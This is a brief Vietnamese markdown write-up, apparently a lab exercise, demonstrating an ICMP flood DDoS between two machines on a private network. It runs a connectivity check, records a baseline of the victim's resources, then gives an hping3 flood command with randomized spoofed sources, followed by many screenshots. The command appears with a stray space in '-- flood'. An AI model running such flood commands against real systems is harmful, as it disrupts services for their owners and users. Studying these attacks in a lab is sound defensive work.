# Triển khai tấn công DDOS

---

## 1.	Tấn công ICMP Flood.

Bước 1: Kiểm tra kết nối giữa 2 máy.
Trước khi tấn công, cần đảm bảo hai máy có thể giao tiếp với nhau. Sử dụng lệnh ping từ cả 2 máy tấn công và máy nạn nhân.
![DDOS](images/attack/1.png)

![DDOS](images/attack/2.png)
Kết quả hiện thị có phản hồi, hai máy đã kết nối thành công.

Bước 2: Kiểm tra trạng thái hệ thống trước khi tấn công.
![DDOS](images/attack/3.png)

![DDOS](images/attack/4.png)
Kết quả cho thấy tài nguyên hệ thống ở mức bình thường, chưa bị quá tải.

Bước 3: Bắt đầu thực hiện tấn công ICMP Flood.
Trên máy tấn công, sử dụng Hping3 để gửi một lượng lớn gói tin ICMP:
```bash
hping3 -1 192.168.214.147 -- flood --rand-source
```
![DDOS](images/attack/5.png)
![DDOS](images/attack/6.png)
![DDOS](images/attack/7.png)
![DDOS](images/attack/8.png)
![DDOS](images/attack/9.png)
![DDOS](images/attack/10.png)
![DDOS](images/attack/11.png)
![DDOS](images/attack/12.png)
![DDOS](images/attack/13.png)
![DDOS](images/attack/14.png)
![DDOS](images/attack/15.png)
![DDOS](images/attack/16.png)
![DDOS](images/attack/17.png)
![DDOS](images/attack/18.png)
![DDOS](images/attack/19.png)
![DDOS](images/attack/20.png)
![DDOS](images/attack/21.png)
![DDOS](images/attack/22.png)
